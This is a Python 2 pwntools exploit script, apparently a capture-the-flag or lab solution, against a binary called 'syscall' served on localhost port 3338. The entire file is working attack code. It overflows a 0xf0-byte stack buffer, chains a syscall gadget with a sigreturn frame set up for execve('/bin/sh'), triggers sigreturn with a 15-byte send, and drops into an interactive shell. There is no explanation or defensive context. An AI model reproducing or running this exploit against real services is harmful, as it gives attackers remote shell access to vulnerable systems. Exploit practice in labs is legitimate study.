#!/usr/bin/python2

from pwn import *

context.binary = "./syscall"

binary = ELF("./syscall")

STACK_SIZE = 0xf0

shell = next(binary.search(b"/bin/sh" + chr(0)))
log.info("String /bin/sh found at %x" % shell)

SYSCALL_ADDR = next(binary.search(asm("syscall")))
log.info("syscall gadget found at %x" % SYSCALL_ADDR)

rop = ROP(binary)

s = remote("localhost", 3338)

s.recvuntil("quit\n")

rop.raw(p64(SYSCALL_ADDR))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve

frame.rdi = shell
frame.rsi = 0
frame.rdx = 0

frame.rip = SYSCALL_ADDR

rop.raw(str(frame))


s.send("A" * (STACK_SIZE + 8) + rop.chain())
s.recvuntil(rop.chain())

quit = "q\n\0"
s.send(quit + "A" * (15 - len(quit)))
s.recvuntil("A"*(15-len(quit)))
s.interactive()
